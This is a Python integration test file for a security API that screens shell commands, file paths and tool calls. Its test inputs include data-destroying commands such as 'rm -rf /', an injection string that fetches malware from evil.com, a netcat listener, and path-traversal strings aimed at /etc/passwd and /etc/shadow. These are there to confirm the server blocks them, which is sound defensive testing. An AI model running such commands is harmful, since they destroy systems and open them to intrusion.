"""Integration Tests for Security API Endpoints (AI-113).

Tests the REST API endpoints for security enforcement, covering all 8 test steps
with real HTTP requests to the server.
"""

import pytest
import json
from aiohttp import web
from aiohttp.test_utils import AioHTTPTestCase, unittest_run_loop
from pathlib import Path
import tempfile

from dashboard.rest_api_server import RESTAPIServer


class TestSecurityAPIEndpoints(AioHTTPTestCase):
    """Integration tests for security API endpoints."""

    async def get_application(self):
        """Create test application."""
        # Use temporary directory for test project
        self.tmpdir = tempfile.TemporaryDirectory()
        self.project_root = Path(self.tmpdir.name)

        server = RESTAPIServer(
            project_name="test-project",
            metrics_dir=self.project_root,
            port=8420,
            host="127.0.0.1"
        )
        return server.app

    async def asyncTearDown(self):
        """Clean up test resources."""
        await super().asyncTearDown()
        self.tmpdir.cleanup()

    @unittest_run_loop
    async def test_bash_command_not_in_allowlist_rejected(self):
        """Test Step 1: Command not in allowlist returns 403."""
        response = await self.client.post(
            '/api/security/bash',
            json={'command': 'sudo rm -rf /'}
        )

        assert response.status == 403
        data = await response.json()
        assert 'error' in data
        assert 'blocked' in data['error'].lower() or 'denied' in data['error'].lower()

    @unittest_run_loop
    async def test_file_outside_project_rejected(self):
        """Test Step 2: File outside project returns 403."""
        response = await self.client.post(
            '/api/security/file/read',
            json={'file_path': '/etc/passwd'}
        )

        assert response.status == 403
        data = await response.json()
        assert 'error' in data
        assert 'denied' in data['error'].lower()

    @unittest_run_loop
    async def test_bash_command_in_allowlist_allowed(self):
        """Test Step 3: Command in allowlist returns 200."""
        response = await self.client.post(
            '/api/security/bash',
            json={'command': 'ls -la'}
        )

        assert response.status == 200
        data = await response.json()
        assert data['status'] == 'allowed'

    @unittest_run_loop
    async def test_file_within_project_allowed(self):
        """Test Step 4: File within project returns 200."""
        response = await self.client.post(
            '/api/security/file/read',
            json={'file_path': 'src/main.py'}
        )

        assert response.status == 200
        data = await response.json()
        assert data['status'] == 'allowed'

    @unittest_run_loop
    async def test_mcp_tool_authorization_required(self):
        """Test Step 5: MCP tool calls require authorization."""
        # Without auth token
        response = await self.client.post(
            '/api/security/mcp/call',
            json={
                'tool_name': 'slack__send_message',
                'tool_input': {'channel': '#general', 'message': 'test'}
            }
        )

        assert response.status == 403
        data = await response.json()
        assert 'authorization' in data['message'].lower()

        # With valid auth token
        response = await self.client.post(
            '/api/security/mcp/call',
            json={
                'tool_name': 'slack__send_message',
                'tool_input': {'channel': '#general', 'message': 'test'},
                'auth_token': 'valid-arcade-token-12345'
            }
        )

        assert response.status == 200
        data = await response.json()
        assert data['status'] == 'authorized'

    @unittest_run_loop
    async def test_malicious_command_injection_blocked(self):
        """Test Step 6: Malicious command injection is blocked."""
        malicious_commands = [
            "ls; rm -rf /",
            "cat file && wget http://evil.com/malware",
            "ls `whoami`",
        ]

        for command in malicious_commands:
            response = await self.client.post(
                '/api/security/bash',
                json={'command': command}
            )

            # Should be blocked
            assert response.status == 403, f"Should block: {command}"

    @unittest_run_loop
    async def test_path_traversal_blocked(self):
        """Test Step 6: Path traversal attempts are blocked."""
        traversal_paths = [
            "../../../etc/passwd",
            "../../../../../../etc/shadow",
            "/./././etc/hosts",
        ]

        for path in traversal_paths:
            response = await self.client.post(
                '/api/security/file/read',
                json={'file_path': path}
            )

            assert response.status == 403, f"Should block: {path}"

    @unittest_run_loop
    async def test_error_messages_no_information_leakage(self):
        """Test Step 7: Error messages don't leak sensitive information."""
        # Try to access forbidden file
        response = await self.client.post(
            '/api/security/file/read',
            json={'file_path': '/etc/passwd'}
        )

        data = await response.json()

        # Should not leak full system paths
        assert '/etc/passwd' not in data.get('message', ''), "Should not leak system path"

        # Should have generic error
        assert 'denied' in data.get('error', '').lower()

        # Try blocked command
        response = await self.client.post(
            '/api/security/bash',
            json={'command': 'malicious_command'}
        )

        data = await response.json()

        # Should not leak allowlist details
        assert 'ALLOWED_COMMANDS' not in json.dumps(data)

    @unittest_run_loop
    async def test_concurrent_security_checks(self):
        """Test Step 8: Concurrent requests are handled correctly."""
        import asyncio

        # Make multiple concurrent requests
        tasks = []

        # Mix of allowed and blocked commands
        commands = [
            ('ls -la', 200),
            ('sudo rm -rf /', 403),
            ('git status', 200),
            ('nc -l 4444', 403),
            ('npm install', 200),
        ]

        async def make_request(command, expected_status):
            response = await self.client.post(
                '/api/security/bash',
                json={'command': command}
            )
            assert response.status == expected_status, f"Expected {expected_status} for {command}"
            return await response.json()

        tasks = [make_request(cmd, status) for cmd, status in commands]
        results = await asyncio.gather(*tasks)

        # All requests should complete successfully
        assert len(results) == len(commands)

    @unittest_run_loop
    async def test_invalid_json_returns_400(self):
        """Test that invalid JSON returns 400."""
        response = await self.client.post(
            '/api/security/bash',
            data='invalid json'
        )

        assert response.status == 400
        data = await response.json()
        assert 'Invalid JSON' in data['error']

    @unittest_run_loop
    async def test_missing_required_field_returns_400(self):
        """Test that missing required fields return 400."""
        # Missing command field
        response = await self.client.post(
            '/api/security/bash',
            json={}
        )

        assert response.status == 400
        data = await response.json()
        assert 'command' in data['error']

    @unittest_run_loop
    async def test_file_write_security(self):
        """Test file write operation security."""
        # Try to write outside project
        response = await self.client.post(
            '/api/security/file/write',
            json={
                'file_path': '/etc/passwd',
                'content': 'malicious content'
            }
        )

        assert response.status == 403

        # Write within project
        response = await self.client.post(
            '/api/security/file/write',
            json={
                'file_path': 'test.txt',
                'content': 'test content'
            }
        )

        assert response.status == 200

    @unittest_run_loop
    async def test_symlink_bypass_blocked(self):
        """Test that symlink bypass attempts are blocked."""
        # Create a symlink that points outside project
        outside_dir = self.tmpdir.name + "_outside"
        Path(outside_dir).mkdir(exist_ok=True)

        symlink_path = self.project_root / "malicious_link"
        symlink_path.symlink_to(outside_dir)

        # Try to access via symlink
        response = await self.client.post(
            '/api/security/file/read',
            json={'file_path': 'malicious_link/secret.txt'}
        )

        assert response.status == 403

        # Cleanup
        symlink_path.unlink()
        Path(outside_dir).rmdir()

    @unittest_run_loop
    async def test_empty_inputs_rejected(self):
        """Test that empty inputs are properly rejected."""
        # Empty command
        response = await self.client.post(
            '/api/security/bash',
            json={'command': ''}
        )
        assert response.status == 403

        # Empty file path
        response = await self.client.post(
            '/api/security/file/read',
            json={'file_path': ''}
        )
        assert response.status == 403

        # Empty tool name
        response = await self.client.post(
            '/api/security/mcp/call',
            json={
                'tool_name': '',
                'tool_input': {},
                'auth_token': 'valid-token-12345'
            }
        )
        assert response.status == 403

    @unittest_run_loop
    async def test_dangerous_rm_commands_blocked(self):
        """Test that dangerous rm commands are blocked."""
        dangerous_commands = [
            "rm -rf /",
            "rm -rf /etc",
            "rm -rf /*",
            "rm -rf /home",
        ]

        for command in dangerous_commands:
            response = await self.client.post(
                '/api/security/bash',
                json={'command': command}
            )
            assert response.status == 403, f"Should block: {command}"

    @unittest_run_loop
    async def test_safe_rm_commands_allowed(self):
        """Test that safe rm commands are allowed."""
        safe_commands = [
            "rm file.txt",
            "rm -rf node_modules",
            "rm -rf build/",
        ]

        for command in safe_commands:
            response = await self.client.post(
                '/api/security/bash',
                json={'command': command}
            )
            assert response.status == 200, f"Should allow: {command}"


# Run tests with pytest
if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
